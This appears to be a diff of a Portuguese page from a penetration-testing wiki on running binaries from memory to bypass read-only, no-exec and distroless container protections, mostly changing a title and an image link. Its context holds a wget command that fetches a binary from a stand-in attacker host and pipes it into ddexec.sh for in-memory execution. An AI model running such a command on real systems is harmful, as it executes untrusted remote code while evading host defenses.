@@ -1,4 +1,4 @@
-# Bypass de proteções do sistema de arquivos: somente leitura / sem execução / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 <details>
 
@@ -81,10 +81,12 @@ Portanto, **controlando o código de montagem** que está sendo executado pelo p
 {% hint style="success" %}
 **DDexec / EverythingExec** permitirá que você carregue e **execute** seu próprio **shellcode** ou **qualquer binário** da **memória**.
 {% endhint %}
+
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+
 ### MemExec
 
 [**Memexec**](https://github.com/arget13/memexec) é o próximo passo natural do DDexec. É um **shellcode demonizado do DDexec**, então toda vez que você quiser **executar um binário diferente** não precisa reiniciar o DDexec, você pode simplesmente executar o shellcode memexec via a técnica DDexec e então **comunicar-se com esse daemon para passar novos binários para carregar e executar**.
@@ -125,7 +127,7 @@ No entanto, nesse tipo de contêineres, essas proteções geralmente existirão,
 
 Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades de RCE** para obter **shells reversos de linguagens de script** e executar binários da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/pt/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Se você está interessado em uma **carreira de hacking** e hackear o inhackeável - **estamos contratando!** (_fluência em polonês escrita e falada necessária_).
 
